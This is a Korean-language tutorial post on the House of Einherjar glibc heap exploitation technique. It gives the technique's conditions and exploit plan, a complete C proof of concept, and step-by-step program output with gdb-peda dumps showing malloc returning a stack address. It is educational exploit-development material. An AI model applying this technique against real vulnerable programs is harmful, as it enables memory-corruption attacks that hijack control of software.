---
title: House of Einherjar
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, house of series]
math: true
mermaid: true
---

## Conditions

- 공격자에 의해 heap을 생성, 해제가 가능해야 함
- 공격자에 의해 stack 영역에 `fake chunk`를 생성할 수 있어야 함
- 공격자에 의해 allocated chunk의 size 값에서 `prev_inuse` flag 값 제거할 수 있어야 함
- 공격자에 의해 변경된 allocated chunk의 size 값 앞 영역(`prev_size`)에 값을 저장할 수 있어야 함
    - heap 영역의 시작 주소 - heap header size(8/16) - `fake chunk` address

## Exploit plan

1. stack 영역에 `fake chunk`(free chunk) 생성
2. 3개의 heap 영역 할당
3. 2번째 heap 영역의 size 값에서 `prev_inuse` flag 값 제거
4. 2번째 heap 영역의 `prev_size` 영역에 값 저장
    - 2번째 heap 영역 시작 주소 - heap header size - `fake chunk` address
5. 2번째 heap 영역 해제
    - `fake chunk`의 `size` 값이 변경됨
6. `fake chunk`의 size 값을 원하는 값으로 변경
7. 원하는 크기의 메모리 영역 할당
    - `fake chunk` address + 0x10 영역 할당됨

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
    fprintf(stderr, "Welcome to House of Einherjar!\n");
    fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n");
    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
    fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n");
    a = (uint8_t*) malloc(0x38);
    fprintf(stderr, "a: %p\n", a);
    
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

    // create a fake chunk
    fprintf(stderr, "\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
    fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
    fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
    fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
    
    
    fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
    fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]);
    fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
    fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
    fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
    fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
    fprintf(stderr, "bck_nextsize: %#lx\n", fake_chunk[5]);

    /* In this case it is easier if the chunk size attribute has a least significant byte with
     * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
     * the chunk includes the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

    fprintf(stderr, "\nWe allocate 0xf8 bytes for 'b'.\n");
    fprintf(stderr, "b: %p\n", b);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

    fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
    a[real_a_size] = 0; 
    fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");

    // Write a fake prev_size to the end of a
    fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    //Change the fake chunk's size to reflect b's new prev_size
    fprintf(stderr, "\nModify fake chunk's size to reflect b's new prev_size\n");
    fake_chunk[1] = fake_size;

    // free b and it will consolidate with our fake chunk
    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    //if we allocate another chunk before we free b we will need to 
    //do two things: 
    //1) We will need to adjust the size of our fake chunk so that
    //fake_chunk + fake_chunk's size points to an area we control
    //2) we will need to write the size of our fake chunk
    //at the location we control. 
    //After doing these two things, when unlink gets called, our fake chunk will
    //pass the size(P) == prev_size(next_chunk(P)) test. 
    //otherwise we need to make sure that our fake chunk is up against the
    //wilderness

    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    fprintf(stderr, "Next malloc(0x200) is at %p\n", d);
}
```

`a`에 `malloc(0x38)` 할당한다.

```
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x38 bytes for 'a'
a: 0x603010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38
```

stack에 `fake chunk` 생성한다.

```
We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffffffe4b0 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffffffe4b0
bck: 0x7fffffffe4b0
fwd_nextsize: 0x7fffffffe4b0
```

fake chunk

```
gdb-peda$ x/24gx 0x7fffffffe4b0
0x7fffffffe4b0: 0x0000000000000100  0x0000000000000100
0x7fffffffe4c0: 0x00007fffffffe4b0  0x00007fffffffe4b0
0x7fffffffe4d0: 0x00007fffffffe4b0  0x00007fffffffe4b0
```

`b`의 metadata인 `size`에서 `prev_inuse` flag를 해제한다.

```
We allocate 0xf8 bytes for 'b'.
b: 0x603050
b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk
```

`b`의 `size`, `prev_inuse` flag가 해제되어 병합이 일어난다.

```
gdb-peda$ x/24gx 0x603040
0x603040:   0x0000000000000000  0x0000000000000100 <-
```

`b`의 `prev_size`에 `b - fake chunk` 한 값을 입력한다.

```
We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x603040 - 0x7fffffffe4b0 = 0xffff800000604b90
```

**fake_size**

```
gdb-peda$ x/gx $rbp-0x50
0x7fffffffe4a0: 0xffff800000604b90
```

`fake chunk`의 size를 `fake_size`로 변조한다.

```
gdb-peda$ x/24gx 0x7fffffffe4b0
0x7fffffffe4b0: 0x0000000000000100  0xffff800000604b90 <-
0x7fffffffe4c0: 0x00007fffffffe4b0  0x00007fffffffe4b0
0x7fffffffe4d0: 0x00007fffffffe4b0  0x00007fffffffe4b0
```

`b`를 `free`한다. `b`의 `prev_inuse`가 해제되어 있어 `b`와 `fake chunk`가 병합된다.

```
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff800000625b51 (b.size + fake_prev_size)
```

free b 후 heapinfo

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x7fffffffe4b0 (size : 0xffff800000625b50) (top is broken ?) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

다음 `malloc()` 시 Stack 영역에 할당된다.

```
Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffffffe4c0
```

**할당된 영역**

```
gdb-peda$ x/24gx 0x7fffffffe4c0-0x10
0x7fffffffe4b0: 0x0000000000000100  0x0000000000000211
0x7fffffffe4c0: 0x00007fffffffe4b0  0x00007fffffffe4b0
```

## References
- [House of einherjar\[Korean\]](https://www.lazenca.net/pages/viewpage.action?pageId=1148149)
